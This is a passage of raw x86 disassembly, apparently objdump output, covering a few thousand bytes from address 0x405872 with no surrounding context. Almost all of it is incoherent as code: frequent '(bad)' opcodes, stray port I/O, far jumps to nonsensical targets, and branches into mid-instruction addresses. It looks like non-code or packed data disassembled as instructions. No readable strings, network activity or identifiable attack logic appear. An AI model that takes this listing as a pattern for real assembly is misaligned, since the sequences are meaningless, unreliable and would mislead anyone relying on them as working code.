  405872:	push   es
  405873:	and    esp,ebx
  405875:	cmp    ah,bh
  405877:	cmp    al,0xf
  405879:	imul   esp,ecx,0xffffffb1
  40587c:	add    DWORD PTR [edx-0x27],0x71709e82
  405883:	sbb    esp,ebp
  405885:	or     al,0xc5
  405887:	test   eax,0x798688a8
  40588c:	scas   al,BYTE PTR es:[edi]
  40588d:	push   esp
  40588e:	sbb    ecx,DWORD PTR [edi+0x18]
  405891:	pop    edx
  405892:	retf   
  405893:	pop    edi
  405894:	add    DWORD PTR [edx+0x26c5e75],ebp
  40589a:	pop    edx
  40589b:	ds cli 
  40589d:	pop    es
  40589e:	ins    DWORD PTR es:[edi],dx
  40589f:	scas   eax,DWORD PTR es:[edi]
  4058a0:	jge    0x40590a
  4058a2:	int    0x39
  4058a4:	pop    ebx
  4058a5:	shr    ebx,1
  4058a7:	adc    BYTE PTR [ecx+edx*4-0xb],dl
  4058ab:	or     al,ch
  4058ad:	sbb    ch,bl
  4058af:	mov    WORD PTR [edi+ebp*8+0x4d],gs
  4058b3:	xor    ch,BYTE PTR [eax-0x42]
  4058b6:	outs   dx,BYTE PTR ds:[esi]
  4058b7:	mov    ds:0x548e84c4,al
  4058bc:	and    eax,0x8d276f17
  4058c1:	int3   
  4058c2:	adc    esi,esp
  4058c4:	outs   dx,DWORD PTR es:[esi]
  4058c6:	(bad)  
  4058c7:	gs into 
  4058c9:	stos   DWORD PTR es:[edi],eax
  4058ca:	cmp    al,0xf6
  4058cc:	enter  0xa,0x6e
  4058d0:	xchg   edi,eax
  4058d1:	sbb    eax,0x3d737038
  4058d6:	pop    es
  4058d7:	sub    DWORD PTR [edx-0x1f],0x6cf826d2
  4058de:	mov    ebp,0xb84c19bb
  4058e3:	xchg   esp,esp
  4058e5:	cmp    dl,ah
  4058e7:	and    cl,cl
  4058e9:	adc    ecx,DWORD PTR [ebx-0x50d7ea01]
  4058ef:	dec    ebx
  4058f0:	popf   
  4058f1:	outs   dx,BYTE PTR ds:[esi]
  4058f2:	lahf   
  4058f3:	jbe    0x40590e
  4058f5:	in     eax,dx
  4058f6:	leave  
  4058f7:	xor    esp,DWORD PTR [ebx]
  4058f9:	push   esi
  4058fa:	pop    edx
  4058fb:	mov    ds:0x6e1e1a35,eax
  405900:	cld    
  405901:	xor    al,0x97
  405903:	stc    
  405904:	mov    edi,0x4298af76
  405909:	and    BYTE PTR [ebx],ch
  40590b:	lds    ebp,FWORD PTR [ebp+ebx*8+0x88cab2c]
  405912:	out    0x55,al
  405914:	pop    edi
  405915:	push   ebx
  405916:	sub    eax,0x813c21d8
  40591b:	pop    ds
  40591c:	in     al,dx
  40591d:	mov    edx,0x3d9300fd
  405922:	aad    0xce
  405924:	into   
  405925:	inc    ebp
  405926:	div    edx
  405928:	and    al,0x35
  40592a:	dec    edi
  40592b:	lods   eax,DWORD PTR ds:[esi]
  40592c:	jo     0x405994
  40592e:	ins    BYTE PTR es:[edi],dx
  40592f:	xor    esp,DWORD PTR [eax]
  405931:	daa    
  405932:	cmp    bl,ch
  405934:	in     al,0xbf
  405936:	dec    ebx
  405937:	and    BYTE PTR [ecx+0x24],dh
  40593a:	adc    al,0x5c
  40593c:	xchg   ecx,eax
  40593d:	repz inc cx
  405940:	cmp    DWORD PTR [ebp+0x20],esi
  405943:	rcr    BYTE PTR [ebx+0x421a12ce],cl
  405949:	and    ah,BYTE PTR [ebp+0x72]
  40594c:	pop    eax
  40594d:	inc    edx
  40594e:	(bad)  
  405950:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405951:	in     eax,0x7d
  405953:	das    
  405954:	inc    esi
  405955:	pushf  
  405956:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405957:	xchg   edx,eax
  405958:	jge    0x4059b5
  40595a:	jmp    0x405940
  40595c:	jne    0x4059b9
  40595e:	jo     0x4059c8
  405960:	push   cs
  405961:	loopne 0x40591c
  405963:	arpl   WORD PTR ds:0x64a59faf,bx
  405969:	mul    BYTE PTR [eax]
  40596b:	push   ss
  40596c:	lods   eax,DWORD PTR ds:[esi]
  40596d:	pop    ebp
  40596e:	cmp    DWORD PTR [ecx+0x6fb46856],ebx
  405974:	pop    ebx
  405975:	fidiv  DWORD PTR [eax-0x28c05d07]
  40597b:	popf   
  40597c:	dec    ecx
  40597d:	mov    esp,0x156c89e1
  405982:	add    cl,BYTE PTR [ecx+0x2561941a]
  405988:	popf   
  405989:	enter  0x6276,0xe3
  40598d:	daa    
  40598e:	int3   
  40598f:	cmp    eax,DWORD PTR [ebx]
  405991:	in     eax,dx
  405992:	int    0xa8
  405994:	setb   BYTE PTR [ebx-0x13]
  405998:	(bad)  
  405999:	pop    esp
  40599a:	jmp    0xc96:0xf2968b7
  4059a1:	jmp    0x4059ff
  4059a3:	xchg   BYTE PTR [eax-0x32],cl
  4059a6:	push   ss
  4059a7:	cs ftst 
  4059aa:	hlt    
  4059ab:	in     al,dx
  4059ac:	ds xchg ebp,eax
  4059ae:	jge    0x4059fd
  4059b0:	data16 arpl WORD PTR [ebx-0x7],di
  4059b4:	data16 sbb bl,BYTE PTR [ebp+0xd01b23c]
  4059bb:	aam    0xb3
  4059bd:	and    bh,ah
  4059bf:	dec    edx
  4059c0:	or     BYTE PTR [edx+0xf4558f9],cl
  4059c6:	fisttp DWORD PTR [ecx+0x9]
  4059c9:	sbb    BYTE PTR [edi],al
  4059cb:	cmp    ebp,ebp
  4059cd:	jmp    0xa58b19c9
  4059d2:	(bad)  
  4059d3:	iret   
  4059d4:	popa   
  4059d5:	push   ax
  4059d7:	jge    0x4059bc
  4059d9:	push   eax
  4059da:	test   al,0x25
  4059dc:	sbb    eax,0xaddde711
  4059e1:	popa   
  4059e2:	outs   dx,BYTE PTR ds:[esi]
  4059e3:	mov    al,ds:0x1ac8e571
  4059e8:	loopne 0x405a4a
  4059ea:	loopne 0x4059cb
  4059ec:	xor    al,bl
  4059ee:	sbb    edx,DWORD PTR [ebp+0x3c]
  4059f1:	add    esi,DWORD PTR [ebp+0x10]
  4059f4:	cmp    edx,esi
  4059f6:	jbe    0x4050e3
  4059fc:	pop    ebx
  4059fd:	mov    eax,0xf89c8539
  405a02:	pop    edi
  405a03:	pop    esi
  405a04:	leave  
  405a05:	ret    0xc
  405a08:	push   ebp
  405a09:	mov    ebp,esp
  405a0b:	mov    eax,DWORD PTR [ebp+0xc]
  405a0e:	jmp    0x405cfe
  405a13:	cmp    eax,0xd4d7d0c1
  405a18:	fnstcw WORD PTR ds:0xbbc9f8d9
  405a1e:	jecxz  0x405a86
  405a20:	xchg   ebp,eax
  405a21:	xor    al,0xfe
  405a23:	cmp    BYTE PTR [bx+si+0x78],bh
  405a27:	dec    ebp
  405a28:	jle    0x405aa2
  405a2a:	js     0x405a58
  405a2c:	cmp    DWORD PTR [eax+edi*4],eax
  405a2f:	(bad)  
  405a30:	push   esi
  405a31:	mov    eax,ds:0xabb7e923
  405a36:	repnz cwde 
  405a38:	mov    dh,0x2b
  405a3a:	sub    al,0x7a
  405a3c:	pop    eax
  405a3d:	stc    
  405a3e:	mov    ds:0x4582c50d,al
  405a43:	ins    DWORD PTR es:[edi],dx
  405a44:	leave  
  405a45:	packsswb mm7,mm6
  405a48:	addr16 test esi,ecx
  405a4b:	inc    esi
  405a4c:	jb     0x405a62
  405a4e:	adc    dl,BYTE PTR [ebx+ecx*8]
  405a51:	pop    edx
  405a52:	dec    edi
  405a53:	jp     0x405ad0
  405a55:	mov    al,ds:0x9b8f7976
  405a5a:	jmp    0x4686:0x71e8fac5
  405a61:	popa   
  405a62:	mov    al,ds:0xb8409c70
  405a67:	mov    ebx,DWORD PTR [ebx+0xb1064f9]
  405a6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a6e:	cmp    cl,BYTE PTR [ecx+eax*4+0x59bdcbe]
  405a75:	cmp    esp,edi
  405a77:	inc    edx
  405a78:	mov    bh,0x2f
  405a7a:	mov    bh,BYTE PTR gs:[ebx]
  405a7d:	jecxz  0x405a30
  405a7f:	sub    dh,ah
  405a81:	sbb    al,0x62
  405a83:	aad    0xa6
  405a85:	adc    ah,BYTE PTR [edi+eiz*4]
  405a88:	(bad)  
  405a89:	adc    bl,BYTE PTR [esi]
  405a8b:	inc    esi
  405a8c:	xchg   DWORD PTR ds:0xb632b069,esp
  405a92:	(bad)
  405a96:	adc    BYTE PTR [edx-0x3e],cl
  405a99:	adc    DWORD PTR [edx+0x17],ecx
  405a9c:	mov    ds:0xb07f5418,al
  405aa1:	jl     0x405aa6
  405aa3:	sbb    edi,DWORD PTR [ebx*4+0x3e5403a2]
  405aaa:	xchg   ecx,eax
  405aab:	or     edi,esi
  405aad:	mov    edi,0xbb4c6dc
  405ab2:	stos   BYTE PTR es:[edi],al
  405ab3:	pop    edx
  405ab4:	cmc    
  405ab5:	mov    ecx,DWORD PTR [eax+0x59ad3e16]
  405abb:	sbb    ah,BYTE PTR [edi-0x3146eccf]
  405ac1:	push   eax
  405ac2:	dec    eax
  405ac3:	in     al,dx
  405ac4:	ss or  cl,bl
  405ac7:	lahf   
  405ac8:	sub    DWORD PTR [ebx+edi*8-0x679edcee],0x76
  405ad0:	int    0x3c
  405ad2:	std    
  405ad3:	data16 jae 0x405aa9
  405ad6:	test   al,0xfe
  405ad8:	ss out 0x74,al
  405adb:	and    eax,0xc187824c
  405ae0:	jp     0x405b48
  405ae2:	addr16 clc 
  405ae4:	inc    ebx
  405ae5:	add    BYTE PTR [edx-0x5d],0xdd
  405ae9:	fwait
  405aea:	imul   BYTE PTR [ebx+0x2e]
  405aed:	xor    esp,DWORD PTR [ebx]
  405aef:	inc    edx
  405af0:	mov    edi,0x2496a60d
  405af5:	cs jb  0x405b35
  405af8:	dec    esp
  405af9:	out    0xba,al
  405afb:	add    al,dh
  405afd:	jmp    0xb9a90f07
  405b02:	lods   eax,DWORD PTR ds:[esi]
  405b03:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  405b05:	loop   0x405b80
  405b07:	push   0xfffffff4
  405b09:	mov    dl,0xef
  405b0b:	mov    ds:0xeeb3f88b,al
  405b10:	or     edi,esi
  405b12:	mov    ebp,ebx
  405b14:	jnp    0x405ac4
  405b16:	and    al,0xa6
  405b18:	dec    esi
  405b19:	mov    fs,esp
  405b1b:	cmc    
  405b1c:	rcl    DWORD PTR [esi-0x2d6d4b6c],0x2c
  405b23:	es inc esi
  405b25:	jns    0x405b31
  405b27:	mul    DWORD PTR [esi-0x73]
  405b2a:	mov    edx,0x1f07dd64
  405b2f:	mov    ecx,0xf48ad1e0
  405b34:	xor    al,0x50
  405b36:	pop    edi
  405b37:	je     0x405ae3
  405b39:	es pop esp
  405b3b:	xor    dh,BYTE PTR [edx-0x7b]
  405b3e:	push   eax
  405b3f:	int    0xf2
  405b41:	les    ebp,FWORD PTR cs:[ebp*8+0x445a0f7a]
  405b49:	nop
  405b4a:	xchg   edx,eax
  405b4b:	jecxz  0x405b98
  405b4d:	fcom   DWORD PTR [eax-0x25]
  405b50:	outs   dx,BYTE PTR ds:[esi]
  405b51:	mov    ?,WORD PTR [edi+0x56]
  405b54:	fwait
  405b55:	or     BYTE PTR [ecx-0x4ea82f00],bh
  405b5b:	mov    esp,0xd35d1793
  405b60:	or     cl,BYTE PTR [ecx]
  405b62:	das    
  405b63:	(bad)  
  405b64:	fs mov edi,0x856ded30
  405b6a:	je     0x405b26
  405b6c:	inc    ebp
  405b6d:	jle    0x405b3e
  405b6f:	(bad)  
  405b70:	fadd   DWORD PTR [esp+ebx*1-0x687d1b0f]
  405b77:	jmp    0x405b85
  405b79:	pop    edi
  405b7a:	mov    ch,0x4
  405b7c:	jne    0x405be1
  405b7e:	int    0xbf
  405b80:	push   ebp
  405b81:	aaa    
  405b82:	call   0xb894:0xd0c610cb
  405b89:	gs push ds
  405b8b:	add    bl,BYTE PTR [ebx-0x7571af7b]
  405b91:	xor    BYTE PTR ds:0x4ae897fc,bh
  405b97:	mov    eax,0xe412fff8
  405b9c:	test   esi,ecx
  405b9e:	sbb    cl,ah
  405ba0:	xchg   DWORD PTR [ecx-0x60],ebx
  405ba3:	(bad)
  405ba6:	popa   
  405ba7:	or     DWORD PTR [ebx],esi
  405ba9:	fs or  cl,al
  405bac:	dec    eax
  405bad:	sbb    al,0xac
  405baf:	arpl   WORD PTR [edx+0x44f7f0cd],ax
  405bb5:	adc    DWORD PTR [edi],0x11
  405bb8:	add    cl,BYTE PTR [eax-0x508d1168]
  405bbe:	mov    ds,WORD PTR [edi+0x23]
  405bc1:	(bad)  
  405bc2:	outs   dx,BYTE PTR ds:[esi]
  405bc3:	pushf  
  405bc4:	rcl    ebx,1
  405bc6:	jle    0x405c29
  405bc8:	or     esi,DWORD PTR [edx-0x794aabbc]
  405bce:	xor    al,0x72
  405bd0:	ins    DWORD PTR es:[edi],dx
  405bd1:	mov    ch,0x30
  405bd3:	call   0xf45:0xb5f2db76
  405bda:	adc    ah,BYTE PTR gs:[ecx-0xb]
  405bde:	pop    ss
  405bdf:	cmp    cl,BYTE PTR [esi+0x7e]
  405be2:	imul   edi,DWORD PTR [eax],0x5785ec3f
  405be8:	sub    bh,bl
  405bea:	sbb    dl,BYTE PTR gs:[eax-0x487a06d4]
  405bf1:	or     eax,0x16fe4fdf
  405bf6:	iret   
  405bf7:	inc    ecx
  405bf8:	mov    ch,0x78
  405bfa:	mov    eax,ds:0xbd366bba
  405bff:	repz iret 
  405c01:	je     0x405bda
  405c03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405c04:	cmp    DWORD PTR [esi],edi
  405c06:	jo     0x405ba6
  405c08:	dec    edi
  405c09:	jge    0x405c70
  405c0b:	repnz sti 
  405c0d:	cmp    dl,bl
  405c0f:	and    eax,0x30d803c2
  405c14:	gs iret 
  405c16:	inc    eax
  405c17:	mov    DWORD PTR [edi+esi*4],edi
  405c1a:	cmp    ebp,edx
  405c1c:	push   esp
  405c1d:	sbb    DWORD PTR [ebp-0x3cc5e9a3],ecx
  405c23:	out    dx,al
  405c24:	adc    al,0x5b
  405c26:	mov    ecx,0x79253d37
  405c2b:	pop    ss
  405c2c:	(bad)  
  405c2d:	mov    ebx,DWORD PTR [ebp-0x37]
  405c30:	sbb    eax,0xc9f319b3
  405c35:	sbb    BYTE PTR [eax-0x5d77864],ah
  405c3b:	inc    ecx
  405c3c:	inc    esi
  405c3d:	retf   
  405c3e:	ja     0x405c88
  405c40:	dec    edx
  405c41:	out    0xa8,al
  405c43:	pop    edi
  405c44:	mov    dl,BYTE PTR [eax-0x61]
  405c47:	jb     0x405c39
  405c49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405c4a:	pop    eax
  405c4b:	fwait
  405c4c:	xchg   esp,eax
  405c4e:	dec    esp
  405c4f:	pop    ebx
  405c50:	arpl   WORD PTR [eax+0x74],bp
  405c53:	loopne 0x405c47
  405c55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405c56:	adc    DWORD PTR [edx+0x2a],eax
  405c59:	sbb    edi,esi
  405c5b:	mov    edi,0x83bbee2d
  405c60:	jmp    0x38f9:0x8de126bc
  405c67:	add    dh,BYTE PTR [edi+0x46407fdf]
  405c6d:	dec    ebx
  405c6e:	in     eax,0xa0
  405c70:	and    BYTE PTR [ebp+0xc],dh
  405c73:	mov    edx,0x83be9270
  405c78:	daa    
  405c79:	lahf   
  405c7a:	xchg   edx,eax
  405c7b:	scas   al,BYTE PTR es:[edi]
  405c7c:	rcr    BYTE PTR [edi+0x2e630c07],cl
  405c82:	mov    esi,0x19b47ba1
  405c87:	xor    ah,BYTE PTR [ecx+0x4097e9f7]
  405c8d:	mov    edi,0xc2d0b550
  405c92:	jg     0x405c22
  405c94:	jg     0x405c63
  405c96:	xlat   BYTE PTR ds:[ebx]
  405c97:	cmp    eax,0x96187b01
  405c9c:	mov    ah,0x26
  405c9e:	lods   eax,DWORD PTR ds:[esi]
  405c9f:	push   ss
  405ca0:	sbb    eax,0x6027ebc9
  405ca5:	or     dh,BYTE PTR [edi+0x43]
  405ca8:	lock outs dx,BYTE PTR ds:[esi]
  405caa:	push   edi
  405cab:	arpl   WORD PTR [edi],ax
  405cad:	push   ebx
  405cae:	mov    di,0x767f
  405cb2:	pop    ebx
  405cb3:	arpl   WORD PTR [esi],bp
  405cb5:	ret    0x9b12
  405cb8:	mov    esp,0xb069604
  405cbd:	add    dh,BYTE PTR [eax]
  405cbf:	cmp    BYTE PTR ds:0x50843192,al
  405cc5:	into   
  405cc6:	nop
  405cc7:	ss in  eax,dx
  405cc9:	jp     0x405c7f
  405ccb:	push   cs
  405ccc:	mov    ebx,0xf9b62e72
  405cd1:	xchg   DWORD PTR [ebx+0x37],edi
  405cd4:	pop    ss
  405cd5:	mov    dl,0x86
  405cd7:	xlat   BYTE PTR ds:[ebx]
  405cd8:	and    al,0xd8
  405cda:	lea    ecx,[esi-0xe]
  405cdd:	cs xchg edi,eax
  405cdf:	or     DWORD PTR [eax+0x18168039],ebp
  405ce5:	std    
  405ce6:	(bad)  [ebp-0x64406166]
  405cec:	cmp    eax,0x553ab22f
  405cf1:	ret    
  405cf2:	mov    eax,0xc9c72cd3
  405cf7:	mov    dl,0xb8
  405cf9:	sub    al,0x5e
  405cfb:	xor    eax,0xd2333d59
  405d00:	jmp    0x405ff0
  405d05:	rol    ebx,1
  405d07:	ror    cl,0xd6
  405d0a:	leave  
  405d0b:	rcr    ebx,1
  405d0d:	aaa    
  405d0e:	mov    eax,0xfc814c09
  405d13:	and    eax,0x783db40c
  405d18:	js     0x405d67
  405d1a:	jle    0x405d94
  405d1c:	js     0x405d3e
  405d1e:	jge    0x405d20
  405d20:	and    al,0xfc
  405d22:	mov    ds,WORD PTR [edi+0x71]
  405d25:	mov    ds:0x1d69641d,al
  405d2a:	(bad)  
  405d2c:	loopne 0x405ccb
  405d2e:	js     0x405ce3
  405d30:	jecxz  0x405d2c
  405d32:	div    BYTE PTR [edx-0x7]
  405d35:	mov    esi,0xf6a2d821
  405d3a:	xor    al,0x1b
  405d3c:	inc    ebp
  405d3d:	fnstcw WORD PTR [edi]
  405d3f:	cwde   
  405d40:	pop    ebx
  405d41:	pop    eax
  405d42:	add    DWORD PTR [ebx-0x4fbcd3b8],esi
  405d48:	jle    0x405cea
  405d4a:	xor    DWORD PTR [esi],0xffffff9b
  405d4d:	je     0x405cf1
  405d4f:	clc    
  405d50:	fwait
  405d51:	outs   dx,BYTE PTR ds:[esi]
  405d52:	mov    esp,0x28a5319c
  405d57:	stos   BYTE PTR es:[edi],al
  405d58:	mov    esi,0xc01f8e0c
  405d5d:	ss xchg ecx,eax
  405d5f:	sbb    BYTE PTR [ecx+0x32],0x8c
  405d63:	sbb    DWORD PTR [edi],ecx
  405d65:	cwde   
  405d66:	dec    edi
  405d67:	inc    eax
  405d68:	loope  0x405d73
  405d6a:	fnstcw WORD PTR [edx+0xc]
  405d6d:	push   cs
  405d6e:	mov    cl,bh
  405d70:	loopne 0x405de4
  405d72:	in     al,0x24
  405d74:	hlt    
  405d75:	and    ah,BYTE PTR [ebp-0x7bbb95e2]
  405d7b:	jns    0x405d62
  405d7d:	and    DWORD PTR [edi],esp
  405d7f:	rcl    DWORD PTR [eax-0x5b597fa6],cl
  405d85:	clc    
  405d86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405d87:	fbstp  TBYTE PTR [edx]
  405d89:	rcr    DWORD PTR [esi+0x7582f7f6],cl
  405d8f:	pushf  
  405d90:	mov    ds:0xdf2a77d8,eax
  405d95:	in     al,dx
  405d96:	mov    bh,0x44
  405d98:	into   
  405d99:	inc    ebx
  405d9a:	pop    esi
  405d9b:	xchg   esi,eax
  405d9c:	into   
  405d9d:	fisttp QWORD PTR [ebx+0x5b]
  405da0:	mov    bh,0xab
  405da2:	mov    BYTE PTR [ebx+0x149d7ae6],0xca
  405da9:	sbb    ah,al
  405dab:	jbe    0x405d5b
  405dad:	enter  0x51fa,0x2e
  405db1:	arpl   si,bp
  405db3:	out    dx,al
  405db4:	pop    esp
  405db5:	leave  
  405db6:	add    ecx,DWORD PTR [ebp-0x25]
  405db9:	into   
  405dba:	or     al,0x89
  405dbc:	(bad)  
  405dbd:	jge    0x405d47
  405dbf:	jp     0x405d97
  405dc1:	mov    edi,0xd34894c5
  405dc6:	aad    0x82
  405dc8:	jp     0x405d60
  405dca:	mov    dl,0x72
  405dcc:	dec    DWORD PTR [ecx]
  405dce:	fcom   QWORD PTR [esi+ecx*1]
  405dd1:	jle    0x405e12
  405dd3:	inc    esi
  405dd4:	dec    esp
  405dd5:	jmp    0x98ed:0x4da26271
  405ddc:	ja     0x405e0d
  405dde:	fmulp  st(2),st
  405de0:	push   0x73
  405de2:	or     eax,0x41116656
  405de7:	loope  0x405e2e
  405de9:	retf   0x8f49
  405dec:	lods   al,BYTE PTR ds:[esi]
  405ded:	jne    0x405dbc
  405def:	fisttp WORD PTR ds:0x3a36dce3
  405df5:	or     ebp,DWORD PTR [ecx+0xe7e30ab]
  405dfb:	idiv   DWORD PTR [eax-0x254b5a8e]
  405e01:	sti    
  405e02:	xor    ecx,DWORD PTR [esi+0x1d]
  405e05:	jecxz  0x405dff
  405e07:	xchg   DWORD PTR [edx-0x3dbdbf68],ebx
  405e0d:	mov    ebx,0xa0a6d8c5
  405e12:	sub    al,0x73
  405e14:	add    DWORD PTR [eax-0x77],esp
  405e17:	scas   al,BYTE PTR es:[edi]
  405e18:	adc    DWORD PTR [edi],esp
  405e1a:	inc    edi
  405e1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e1c:	inc    edi
  405e1d:	inc    esi
  405e1e:	add    eax,0xe015bedb
  405e23:	mov    edx,0x91eb448d
  405e28:	pop    esp
  405e29:	adc    DWORD PTR [eax-0x3270d417],0xc5efd121
  405e33:	xor    al,0x59
  405e35:	lds    esp,FWORD PTR [edi+0x58]
  405e38:	into   
  405e39:	and    edi,esp
  405e3b:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405e3d:	sub    ah,bl
  405e3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405e40:	sub    eax,0x5c0ab9e0
  405e45:	inc    eax
  405e46:	pop    edi
  405e47:	mov    dl,bl
  405e49:	push   edi
  405e4a:	and    BYTE PTR [ebx-0x3f74ed74],0x64
  405e51:	pop    ebx
  405e52:	xchg   edi,eax
  405e53:	ret    
  405e54:	jmp    0x405dda
  405e56:	xor    al,0x1a
  405e58:	mov    esi,0xb1c0a8f7
  405e5d:	or     DWORD PTR [ebp-0x32],edx
  405e60:	inc    ebx
  405e61:	leave  
  405e62:	push   esp
  405e63:	fisubr DWORD PTR [edx-0x1e51dbd6]
  405e69:	fsincos 
  405e6b:	pop    edi
  405e6c:	out    0x8f,eax
  405e6e:	addr16 sub al,0xcd
  405e71:	sbb    dh,BYTE PTR [edx+0x61]
  405e74:	push   ds
  405e75:	call   ebx
  405e77:	lea    ebx,[ebx-0x5d]
  405e7a:	retf   
  405e7b:	mov    ebp,0x70f94428
  405e80:	outs   dx,DWORD PTR ds:[esi]
  405e81:	lods   eax,DWORD PTR ds:[esi]
  405e82:	xchg   edx,eax
  405e83:	dec    esp
  405e84:	sbb    eax,0x9670a8c9
  405e89:	jp     0x405e42
  405e8b:	repnz sbb bh,bh
  405e8e:	jb     0x405e79
  405e90:	and    esp,DWORD PTR [eax+0x6a82e914]
  405e96:	mov    eax,edx
  405e98:	sbb    ah,BYTE PTR [ebp-0x77fb1f43]
  405e9e:	push   ds
  405e9f:	inc    eax
  405ea0:	push   es
  405ea1:	mov    ds:0xd3dc1194,eax
  405ea6:	or     al,0x85
  405ea8:	test   DWORD PTR [esi+0x586f59d0],eax
  405eae:	jl     0x405f1f
  405eb0:	push   esp
  405eb1:	je     0x405ed0
  405eb3:	ret    
  405eb4:	out    dx,al
  405eb5:	jmp    0x4259e225
  405eba:	add    al,0x7d
  405ebc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ebd:	ds aam 0x65
  405ec0:	xchg   edi,eax
  405ec1:	mov    al,ds:0xf57be57e
  405ec6:	jne    0x405e61
  405ec8:	jg     0x405e52
  405eca:	in     eax,dx
  405ecb:	inc    ebx
  405ecc:	and    al,0xfb
  405ece:	mov    DWORD PTR [ecx],ebp
  405ed0:	xchg   edi,eax
  405ed1:	pop    ebp
  405ed2:	sbb    eax,0xb10d3f43
  405ed7:	xor    DWORD PTR [ecx+0x61],eax
  405eda:	or     BYTE PTR [ebx+eiz*4-0x19],0xb3
  405edf:	rcl    DWORD PTR [edi+0xf],cl
  405ee2:	ret    0xf695
  405ee5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ee6:	and    ebx,DWORD PTR [edx]
  405ee8:	call   DWORD PTR [eax-0x2d24a364]
  405eee:	xchg   esp,eax
  405eef:	push   cs
  405ef0:	sbb    cl,BYTE PTR [eax]
  405ef2:	test   BYTE PTR [eax],ch
  405ef4:	popf   
  405ef5:	aam    0xb2
  405ef7:	test   eax,0x465ae303
  405efc:	push   ss
  405efd:	inc    ebp
  405efe:	and    al,cl
  405f00:	jae    0x405e83
  405f02:	mov    esi,0x6305dc7c
  405f07:	jnp    0x405f7a
  405f09:	cmp    BYTE PTR [ecx-0x1d],bl
  405f0c:	loope  0x405f23
  405f0e:	adc    al,0xc
  405f10:	call   0x54a5:0x93571911
  405f17:	xchg   esp,eax
  405f18:	mov    esp,0x7b8400d
  405f1d:	dec    ebx
  405f1e:	adc    al,0x13
  405f20:	pop    esi
  405f21:	iret   
  405f22:	mov    esp,0xd13c0c1
  405f27:	test   al,0x35
  405f29:	imul   ebp,DWORD PTR [eax],0xf02b874
  405f2f:	push   es
  405f30:	dec    esp
  405f31:	mov    ebp,0xebd97797
  405f36:	mov    ah,0x77
  405f38:	add    eax,0xef1411a3
  405f3d:	dec    esp
  405f3e:	pop    es
  405f3f:	inc    eax
  405f40:	or     eax,0x7c156bcb
  405f45:	push   es
  405f46:	or     DWORD PTR [esi+edx*8+0x7c],0x5c
  405f4b:	mul    DWORD PTR [eax]
  405f4d:	in     eax,0xba
  405f4f:	xchg   edx,eax
  405f50:	add    DWORD PTR ds:0x66946664,eax
  405f56:	mov    ecx,0x7346498b
  405f5b:	cmp    ch,BYTE PTR [ebp+0x4e]
  405f5e:	jg     0x405f30
  405f60:	dec    eax
  405f61:	mov    edx,0xc29ec042
  405f66:	push   edx
  405f67:	add    al,0xaa
  405f69:	sbb    edx,DWORD PTR [esi]
  405f6b:	inc    eax
  405f6c:	pop    esi
  405f6d:	or     DWORD PTR [edx+0x4b7aa930],edx
  405f73:	mov    ds:0xa798feef,eax
  405f78:	(bad)  
  405f79:	retf   
  405f7a:	inc    ebp
  405f7b:	jae    0x405f92
  405f7d:	int3   
  405f7e:	dec    esi
  405f7f:	xor    eax,0xeda03cd4
  405f84:	(bad)  
  405f86:	(bad)  
  405f87:	and    ebp,0x31a1154a
  405f8d:	inc    ecx
  405f8e:	or     BYTE PTR [edi],al
  405f90:	inc    esi
  405f91:	(bad)  
  405f92:	out    0xf2,al
  405f94:	inc    BYTE PTR [esi]
  405f96:	cdq    
  405f97:	fwait
  405f98:	(bad)  
  405f99:	push   edx
  405f9a:	inc    ebp
  405f9b:	in     al,dx
  405f9c:	add    edi,DWORD PTR [edi-0x7f9baf3b]
  405fa2:	mov    esp,0xf1442092
  405fa7:	je     0x405f37
  405fa9:	test   eax,0xfd4d42c1
  405fae:	loop   0x405fcc
  405fb0:	inc    eax
  405fb1:	jmp    0xb98333f
  405fb6:	call   0xa26210e1
  405fbb:	out    dx,eax
  405fbc:	stos   BYTE PTR es:[edi],al
  405fbd:	jmp    0x405fc5
  405fbf:	mov    ch,0x13
  405fc1:	jno    0x405fff
  405fc3:	int    0x6e
  405fc5:	push   es
  405fc6:	dec    DWORD PTR [edx]
  405fc8:	fcmovb st,st(3)
  405fca:	aaa    
  405fcb:	xchg   ebx,eax
  405fcc:	dec    ebx
  405fcd:	jl     0x406002
  405fcf:	es push esp
  405fd1:	mov    edx,0x4cf46f05
  405fd6:	(bad)  
  405fd7:	cmp    dl,dh
  405fd9:	hlt    
  405fda:	in     al,0x71
  405fdc:	jl     0x405f87
  405fde:	and    edx,DWORD PTR [esi-0x4567d578]
  405fe4:	(bad)  
  405fe5:	mov    edi,0xc199cf55
  405fea:	sub    al,0x61
  405fec:	jne    0x405fd0
  405fee:	pop    ebx
  405fef:	stc    
  405ff0:	mov    ecx,0x7264fd50
  405ff5:	jmp    0x4062e5
  405ffa:	iret   
  405ffb:	rcl    ebx,cl
  405ffd:	retf   
  405ffe:	ror    ebx,cl
  406000:	xlat   BYTE PTR ds:[ebx]
  406001:	(bad)  [ecx]
  406003:	lods   eax,DWORD PTR ds:[esi]
  406004:	and    al,0xa9
  406006:	out    dx,al
  406007:	mov    esi,0xc289deab
  40600c:	js     0x406086
  40600e:	dec    ebp
  40600f:	jle    0x406089
  406011:	js     0x406003
  406013:	scas   eax,DWORD PTR es:[edi]
  406014:	xchg   ebx,eax
  406015:	inc    esp
  406016:	push   0xfffffff3
  406018:	sub    dl,BYTE PTR [ebx-0x13]
  40601b:	mov    eax,0xb041fa31
  406020:	es into 
  406022:	ret    
  406023:	retf   
  406024:	jmp    0x4060a5
  406026:	jg     0x406034
  406028:	ins    DWORD PTR es:[edi],dx
  406029:	les    ebx,FWORD PTR [edx]
  40602b:	push   eax
  40602c:	lods   al,BYTE PTR ds:[esi]
  40602d:	inc    edi
  40602e:	pushf  
  40602f:	ins    BYTE PTR es:[edi],dx
  406030:	(bad)  
  406031:	(bad)  
  406032:	pop    ebx
